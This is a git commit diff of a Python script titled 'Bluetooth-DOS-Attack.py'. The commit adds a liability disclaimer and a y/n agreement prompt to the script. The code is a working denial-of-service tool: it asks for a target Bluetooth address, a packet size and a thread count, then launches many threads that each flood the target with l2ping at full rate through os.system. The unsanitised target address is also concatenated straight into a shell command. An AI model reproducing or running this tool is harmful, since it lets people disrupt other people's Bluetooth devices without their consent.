e13709d72fd1afaa34576d9e44d68e0abe25b945
Egor <38296908+jieggiI@users.noreply.github.com>
2018-10-31 13:57:23 +0300

    Update Bluetooth-DOS-Attack.py
    Added agreement

--- Bluetooth-DOS-Attack.py
+++ Bluetooth-DOS-Attack.py
@@ -1,7 +1,6 @@
 import os
 import threading
 import time
-import random
 
 def DOS(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
@@ -23,40 +22,49 @@ def main():
     printLogo()
     time.sleep(0.1)
     print('')
+    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
+    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
+        time.sleep(0.1)
+        os.system('clear')
+        printLogo()
+        print('')
 
-    target_addr = input('Target addr > ')
+        target_addr = input('Target addr > ')
 
-    if len(target_addr) < 1:
-        print('[!] ERROR: Target addr is missing')
+        if len(target_addr) < 1:
+            print('[!] ERROR: Target addr is missing')
+            exit(0)
+
+        try:
+            packages_size = int(input('Packages size > '))
+        except:
+            print('[!] ERROR: Packages size must be an integer')
+            exit(0)
+        try:
+            threads_count = int(input('Threads count > '))
+        except:
+            print('[!] ERROR: Threads count must be an integer')
+            exit(0)
+        print('')
+        os.system('clear')
+
+        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
+
+        for i in range(0, 3):
+            print('[*] ' + str(3 - i))
+            time.sleep(1)
+        os.system('clear')
+        print('[*] Building threads...\n')
+
+        for i in range(0, threads_count):
+            print('[*] Built thread №' + str(i + 1))
+            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
+
+        print('[*] Built all threads...')
+        print('[*] Starting...')
+    else:
+        print('Bip bip')
         exit(0)
-
-    try:
-        packages_size = int(input('Packages size > '))
-    except:
-        print('[!] ERROR: Packages size must be an integer')
-        exit(0)
-    try:
-        threads_count = int(input('Threads count > '))
-    except:
-        print('[!] ERROR: Threads count must be an integer')
-        exit(0)
-    print('')
-    os.system('clear')
-    
-    print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
-
-    for i in range(0, 3):
-        print('[*] ' + str(3 - i))
-        time.sleep(1)
-    os.system('clear')
-    print('[*] Building threads...\n')
-
-    for i in range(0, threads_count):
-        print('[*] Built thread №' + str(i + 1))
-        threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
-    
-    print('[*] Built all threads...')
-    print('[*] Starting...')
 
 if __name__ == '__main__':
     try:
